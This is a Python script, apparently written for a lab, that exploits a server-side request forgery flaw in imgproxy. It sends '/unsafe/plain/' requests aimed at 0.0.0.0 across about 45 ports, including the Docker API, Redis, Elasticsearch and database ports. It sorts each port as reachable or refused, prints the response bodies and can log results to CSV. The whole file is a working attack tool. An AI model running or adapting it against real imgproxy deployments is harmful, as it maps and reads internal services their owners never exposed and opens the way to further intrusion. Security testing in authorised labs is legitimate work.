import argparse
import csv
import sys
import time
from typing import List, Tuple
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    print("[-] Missing 'requests' package. Install it with: py -m pip install requests", file=sys.stderr)
    sys.exit(1)

DEFAULT_PORTS = [
    22,25,53,80,81,88,110,123,135,139,143,161,389,443,445,465,587,636,993,995,
    2375,2376,3000,3306,5000,5432,5632,5672,5900,5985,5986,6379,8000,8080,8081,
    8088,8443,8500,8600,9000,9200,9300,10000,11211,15672,27017
]

DEFAULT_PATHS = ["/"]
DEFAULT_SCHEMES = ["http", "https"]

def verdict_from(code: int, body_snippet: str) -> str:
    if code == 0:
        return "timeout/imgproxy_unreachable"
    if code == 500:
        txt = (body_snippet or "").lower()
        if "connection refused" in txt:
            return "closed/refused"
        return "error(500)"
    if code == 422:
        return "reachable(non-image)"
    return "reachable"

def normalize_target(scheme: str, port: int, path: str) -> str:
    base = f"{scheme}://0.0.0.0:{port}/"
    if not path:
        path = "/"
    normalized = urljoin(base, path.lstrip("/"))
    return normalized

def try_one(session: requests.Session, server: str, scheme: str, port: int, path: str,
            timeout: float, max_body: int) -> Tuple[int, int, str, str, bytes]:
    target_url = normalize_target(scheme, port, path)
    imgproxy_url = f"http://{server}/unsafe/plain/{target_url}"
    try:
        r = session.get(imgproxy_url, timeout=timeout, verify=False, allow_redirects=False)
        body = r.content or b""
        snippet = body[:min(len(body), 2048)].decode("utf-8", errors="ignore")
        code = r.status_code
        ctype = r.headers.get("Content-Type", "")
        v = verdict_from(code, snippet)
        if max_body >= 0 and len(body) > max_body:
            body = body[:max_body]
        return code, len(r.content or b""), ctype, v, body
    except requests.exceptions.Timeout:
        return 0, 0, "", "timeout", b""
    except requests.exceptions.RequestException as e:
        msg = str(e).lower()
        if "timed out" in msg:
            return 0, 0, "", "timeout", b""
        return 0, 0, "", f"client_error:{type(e).__name__}", b""

def parse_list(s: str, cast=int) -> List:
    if not s:
        return []
    out = []
    for item in s.split(","):
        item = item.strip()
        if item == "":
            continue
        out.append(cast(item) if cast is not str else item)
    return out

def main():
    ap = argparse.ArgumentParser(description="Enumerate internal services reachable via imgproxy SSRF (lab)")
    ap.add_argument("--server", required=True, help="imgproxy host:port (e.g., 192.168.187.195:8080)")
    ap.add_argument("--ports", default=",".join(map(str, DEFAULT_PORTS)), help="Comma-separated ports list")
    ap.add_argument("--schemes", default=",".join(DEFAULT_SCHEMES), help="Comma-separated schemes (http,https)")
    ap.add_argument("--paths", default=",".join(DEFAULT_PATHS), help="Comma-separated paths (e.g., /,/favicon.ico)")
    ap.add_argument("--timeout", type=float, default=3.0, help="Per-request timeout (seconds)")
    ap.add_argument("--csv", default=None, help="(Optional) Output CSV file path")
    ap.add_argument("--sleep", type=float, default=0.0, help="Sleep between requests (seconds)")
    ap.add_argument("--max-body", type=int, default=1024,
                    help="Max bytes of response body to print for non-500 codes (-1 for full body)")
    args = ap.parse_args()

    ports = parse_list(args.ports, int)
    schemes = parse_list(args.schemes, str)
    paths = parse_list(args.paths, str)

    print(f"[+] Target imgproxy: {args.server}")
    print(f"[+] Ports: {len(ports)}  Schemes: {schemes}  Paths: {paths}")
    print(f"[+] Timeout: {args.timeout}s  CSV: {args.csv or '(disabled)'}")

    writer = None
    if args.csv:
        fcsv = open(args.csv, "w", newline="", encoding="utf-8")
        writer = csv.writer(fcsv)
        writer.writerow(["target", "scheme", "port", "path", "http_code", "bytes", "content_type", "verdict"])

    s = requests.Session()
    s.headers.update({"User-Agent": "imgproxy-ssrf-enum/2.0"})

    try:
        for p in ports:
            for scheme in schemes:
                for path in paths:
                    code, nbytes, ctype, v, body = try_one(
                        s, args.server, scheme, p, path, args.timeout, args.max_body
                    )
                    status = f"{code}" if code != 0 else "000"
                    target_url = normalize_target(scheme, p, path)
                    print(f"{target_url:<40} -> code={status:>3} bytes={nbytes:<6} type={ctype:<28} verdict={v}")
                    if code != 500 and body:
                        try:
                            text = body.decode("utf-8", errors="replace")
                            print("----- RESPONSE (truncated) -----")
                            print(text)
                            print("----- END RESPONSE --------------")
                        except Exception:
                            print(f"[!] Binary response ({len(body)} bytes) omitted")

                    if writer:
                        writer.writerow(["0.0.0.0", scheme, p, path if path.startswith("/") else f"/{path}",
                                         code, nbytes, ctype, v])

                    if args.sleep > 0:
                        time.sleep(args.sleep)
    finally:
        if args.csv:
            fcsv.close()

    if args.csv:
        print(f"[+] Scan complete. Results saved to {args.csv}")
    else:
        print("[+] Scan complete.")

if __name__ == "__main__":
    main()
